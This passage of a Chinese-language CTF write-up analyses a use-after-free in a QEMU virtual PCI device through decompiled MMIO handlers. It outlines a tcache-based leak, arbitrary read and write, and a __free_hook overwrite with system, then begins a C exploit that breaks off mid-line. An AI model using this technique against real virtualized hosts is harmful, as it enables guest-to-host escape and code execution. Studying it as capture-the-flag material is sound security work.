class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      opaque-&gt;result_addr = val;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      opaque-&gt;idx = val;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;req )</span><br><span class="line">        handle_data_read(opaque, opaque-&gt;req, opaque-&gt;idx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x14</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( !opaque-&gt;req )</span><br><span class="line">        opaque-&gt;req = create_req(opaque-&gt;size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x18</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;req )</span><br><span class="line">        delete_req(opaque-&gt;req);</span><br><span class="line">      opaque-&gt;req = <span class="number">0LL</span>;</span><br><span class="line">      opaque-&gt;size = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数根据<code>cmd</code>为<code>fun</code>结构体中的不同的成员变量赋值，其中当<code>cmd=0x14</code>的时候会为<code>req</code>创建相应的结构体，我们看一下这个函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">FunReq *__cdecl <span class="title function_">create_req</span><span class="params">(uint32_t_0 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint32_t_0 i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  uint32_t_0 t; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  FunReq *req; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1FBFF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  req = (FunReq *)<span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(req, <span class="number">0</span>, <span class="keyword">sizeof</span>(FunReq));</span><br><span class="line">  req-&gt;total_size = size;</span><br><span class="line">  t = (req-&gt;total_size &gt;&gt; <span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; t; ++i )</span><br><span class="line">    req-&gt;<span class="built_in">list</span>[i] = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> req;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即按照<code>opaque-&gt;size</code>的值为<code>req</code>的成员变量<code>total_size</code>赋值，<code>req-&gt;list</code>中堆块指针数量由<code>(size&gt;&gt;10) + 1</code>决定，其中最多为<code>127</code>个。当<code>cmd</code>为<code>0x18</code>的时候会调用<code>delete_req</code>函数，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">delete_req</span><span class="params">(FunReq *req)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint32_t_0 i; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  uint32_t_0 t; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  t = (req-&gt;total_size &gt;&gt; <span class="number">10</span>) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; t; ++i )</span><br><span class="line">    <span class="built_in">free</span>(req-&gt;<span class="built_in">list</span>[i]);</span><br><span class="line">  <span class="built_in">free</span>(req);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<code>req-&gt;total_size</code>的值，依次释放<code>req-&gt;list[i]</code>指向的内存空间。当<code>cmd=0x10</code>且<code>req!=NULL</code>的时候会调用<code>handle_data_read</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">handle_data_read</span><span class="params">(FunState *fun, FunReq *req, uint32_t_0 val)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( req-&gt;total_size &amp;&amp; val &lt;= <span class="number">0x7E</span> &amp;&amp; val &lt; (req-&gt;total_size &gt;&gt; <span class="number">10</span>) + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    put_result(fun, <span class="number">1u</span>);</span><br><span class="line">    dma_memory_read_9(fun-&gt;as, (val &lt;&lt; <span class="number">10</span>) + fun-&gt;addr, req-&gt;<span class="built_in">list</span>[val], <span class="number">0x400</span>uLL);</span><br><span class="line">    put_result(fun, <span class="number">2u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">put_result</span><span class="params">(FunState *fun, uint32_t_0 val)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint32_t_0 result; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = val;</span><br><span class="line">  dma_memory_write_9(fun-&gt;as, fun-&gt;result_addr, &amp;result, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">dma_memory_write_9</span><span class="params">(AddressSpace_0 *as, <span class="type">dma_addr_t</span> addr, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> dma_memory_rw_24(as, addr, (<span class="type">void</span> *)buf, len, DMA_DIRECTION_FROM_DEVICE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">dma_memory_read_9</span><span class="params">(AddressSpace_0 *as, <span class="type">dma_addr_t</span> addr, <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> dma_memory_rw_24(as, addr, buf, len, DMA_DIRECTION_TO_DEVICE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里首先调用<code>put_result</code>将固定的值写入到<code>fun-&gt;result_addr</code>指向的物理内存中，然后调用<code>dma_memory_read_9</code>函数将<code>fun-&gt;addr+(val &lt;&lt; 10)</code>指向的物理内存中的内容写入到<code>req-&gt;list[index]</code>指向的内存空间中。即写入数据。</p><p>再来看一下<code>mmio_read</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">uint32_t_0 __cdecl <span class="title function_">fun_mmio_read</span><span class="params">(FunState *opaque, hwaddr cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint32_t_0 val; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  val = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0uLL</span>:</span><br><span class="line">      val = opaque-&gt;size;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">      val = opaque-&gt;addr;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8uLL</span>:</span><br><span class="line">      val = opaque-&gt;result_addr;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0xC</span>uLL:</span><br><span class="line">      val = opaque-&gt;idx;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x10</span>uLL:</span><br><span class="line">      <span class="keyword">if</span> ( opaque-&gt;req )</span><br><span class="line">        handle_data_write(opaque, opaque-&gt;req, opaque-&gt;idx);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> val;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到是根据<code>cmd</code>的值来决定返回的<code>FunState</code>中的成员变量的值，当<code>cmd=0x10</code>的时候如果<code>req!=NUll</code>那么就会调用<code>handle_data_write</code>函数看一下该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">handle_data_write</span><span class="params">(FunState *fun, FunReq *req, uint32_t_0 idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( req-&gt;total_size &amp;&amp; idx &lt;= <span class="number">0x7E</span> &amp;&amp; idx &lt; (req-&gt;total_size &gt;&gt; <span class="number">10</span>) + <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    put_result(fun, <span class="number">1u</span>);</span><br><span class="line">    dma_memory_write_9(fun-&gt;as, (idx &lt;&lt; <span class="number">10</span>) + fun-&gt;addr, req-&gt;<span class="built_in">list</span>[idx], <span class="number">0x400</span>uLL);</span><br><span class="line">    put_result(fun, <span class="number">2u</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">put_result</span><span class="params">(FunState *fun, uint32_t_0 val)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint32_t_0 result; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = val;</span><br><span class="line">  dma_memory_write_9(fun-&gt;as, fun-&gt;result_addr, &amp;result, <span class="number">4uLL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">dma_memory_write_9</span><span class="params">(AddressSpace_0 *as, <span class="type">dma_addr_t</span> addr, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">dma_addr_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> dma_memory_rw_24(as, addr, (<span class="type">void</span> *)buf, len, DMA_DIRECTION_FROM_DEVICE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数的作用是首先调用<code>put_result</code>将固定的值写入到<code>fun-&gt;result_addr</code>指向的物理内存中，然后调用<code>dma_memory_write_9</code>函数将<code>req-&gt;list[index]</code>指向的内存空间中的内容写入到<code>fun-&gt;addr + (index &lt;&lt; 10)</code>指向的物理内存中，即读取<code>req-&gt;list[index]</code>中的数据。与<code>handle_data_read</code>函数类似。</p><p>漏洞位于<code>put_result</code>函数中，该函数最终调用的是<code>fun_mmio_write()</code>函数，其中参数就是我们设置的<code>result_addr</code>，也就是说如果我们将<code>result_addr</code>设置为<code>mmio_address+0x18</code>，那么函数最终就是调用<code>fun_mmio_write(0x18)</code>，也就是会调用<code>delete_req</code>函数。那么之后的<code>dma_memory_read/write</code>函数就会读写已经释放的堆块，造成一个<code>UAF</code>漏洞。</p><p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2020-RealWorld-CTF/1.png" alt="2020%20RealWorld%20CTF%20%E9%83%A8%E5%88%86PWN%20WriteUp%20babc3e7ed9524894887ff486dbc28960/Untitled.png"></p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>这里如果我们首先申请多个<code>req</code>即<code>0x400</code>大小的堆块，那么在<code>delete req</code>的时候，这些堆块就会进入<code>tcache</code>中，因此这里如果我们读取数据的话就会泄漏出<code>heap</code>地址和<code>tcache entry</code>的地址，根据<code>heap</code>地址我们可以计算得到<code>req</code>的堆地址。需要注意的是，在<code>req</code>释放之后前<code>0x10</code>字节会被覆写，因此我们需要将<code>index</code>设置为<code>1/2</code>进行读取。</p><p>得到<code>req</code>地址之后我们可以将<code>tcache-&gt;fd,bk</code>改写为<code>req address,tcache entry</code>，那么在之后进行<code>create req</code>的时候<code>req-&gt;list[2]=req</code>，这样我们就可以做到任意地址读写。</p><p>任意地址读写之后就可以读取<code>tcache entry</code>中的残留数据，泄漏出<code>proc address</code>，之后读取<code>puts got</code>泄漏得到<code>libc</code>基址，覆写<code>free_hook-0x10</code>为<code>&quot;cat /falg&quot;+system_address</code>。那么在释放的时候就会输出<code>flag</code>。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_mem;</span><br><span class="line"><span class="type">uint32_t</span> mmio_addr = <span class="number">0xfebf1000</span>;</span><br><span class="line"><span class="type">uint32_t</span> mmio_size = <span class="number">0x1000</span>;</span><br><span class="line"><span class="type">uint64_t</span> elf_puts_got = <span class="number">0x100dd38</span>;</span><br><span class="line"><span class="type">uint64_t</span> libc_puts_offset = <span class="number">0x875a0</span>;</span><br><span class="line"><span class="type">uint64_t</span> libc_system_offset = <span class="number">0x55410</span>;</span><br><span class="line"><span class="type">uint64_t</span> libc_free_hook_offset = <span class="number">0x1eeb28</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">page_offset</span><span class="params">(<span class="type">uint32_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span>&lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gfn</span><span class="params">(<span class="type">void</span>*addr)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>*ptr;</span><br><span class="line">    <span class="type">uint64_t</span> ptr_mem;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="type">size_t</span> offset;</span><br><span class="line">    offset = ((<span class="type">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>; <span class="comment">// *8</span></span><br><span class="line">    lseek(fd, offset, SEEK_SET);</span><br><span class="line">    read(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span><span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">gva_to_gpa</span><span class="params">(<span class="type">void</span>*addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    assert(gfn != <span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">return</span>(gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="type">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">die</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mem_map</span><span class="params">( <span class="type">const</span> <span class="type">char</span>* dev, <span class="type">size_t</span> offset, <span class="type">size_t</span> size )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open( dev, O_RDWR | O_SYNC );</span><br><span class="line">    <span class="keyword">if</span> ( fd == <span class="number">-1</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* result = mmap( <span class="literal">NULL</span>, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, offset );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !result ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close( fd );</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">0</span>)&#123;</span><br><span class="line">        *((<span class="type">uint8_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">1</span>)&#123;</span><br><span class="line">        *((<span class="type">uint16_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>)&#123;</span><br><span class="line">        *((<span class="type">uint32_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">3</span>)&#123;</span><br><span class="line">        *((<span class="type">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint32_t</span> addr, <span class="type">int</span> choice)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint8_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint16_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">3</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> *((<span class="type">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_size</span><span class="params">(<span class="type">uint32_t</span> size)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0</span>, size &lt;&lt; <span class="number">10</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_addr</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">4</span>, addr, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_result_addr</span><span class="params">(<span class="type">uint32_t</span> addr)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">8</span>, addr, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title 